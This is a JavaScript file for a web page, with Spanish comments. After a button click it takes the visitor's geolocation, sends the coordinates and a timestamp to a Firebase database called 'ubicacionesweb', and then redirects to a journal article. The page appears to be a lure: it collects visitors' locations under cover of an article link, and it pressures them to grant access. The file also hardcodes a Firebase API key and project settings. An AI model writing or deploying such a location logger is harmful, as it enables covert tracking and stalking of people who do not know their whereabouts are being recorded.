// Importar Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDo4j7zm_poOFz5tRUkRULjxrZO2jlOuaM",
    authDomain: "ubicacionesweb.firebaseapp.com",
    databaseURL: "https://ubicacionesweb-default-rtdb.firebaseio.com",
    projectId: "ubicacionesweb",
    storageBucket: "ubicacionesweb.firebasestorage.app",
    messagingSenderId: "916561063858",
    appId: "1:916561063858:web:316104fb181e9377fabeab"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Función para obtener la ubicación, guardarla en Firebase y redirigir
function obtenerUbicacion() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const timestamp = new Date().toLocaleString();

                // Guardar en Firebase
                push(ref(database, "ubicaciones"), {
                    latitud: lat,
                    longitud: lon,
                    fecha: timestamp
                })
                .then(() => {
                    console.log("Ubicación guardada en Firebase:", lat, lon);
                    // Redirigir a la página deseada
                    window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
                })
                .catch((error) => {
                    console.error("Error al guardar ubicación:", error);
                });
            },
            (error) => {
                console.error("Error al obtener la ubicación:", error.message);
                alert("Debes permitir el acceso a la ubicación.");
            }
        );
    } else {
        alert("Tu navegador no soporta geolocalización.");
    }
}

// Esperar a que el DOM se cargue completamente
document.addEventListener("DOMContentLoaded", () => {
    const aceptarBtn = document.getElementById("aceptar");
    if (aceptarBtn) {
        aceptarBtn.addEventListener("click", () => {
            const modal = document.getElementById("modal");
            if (modal) {
                modal.style.display = "none";
            }
            obtenerUbicacion();
        });
    } else {
        console.error("No se encontró el botón con id 'aceptar'");
    }
});
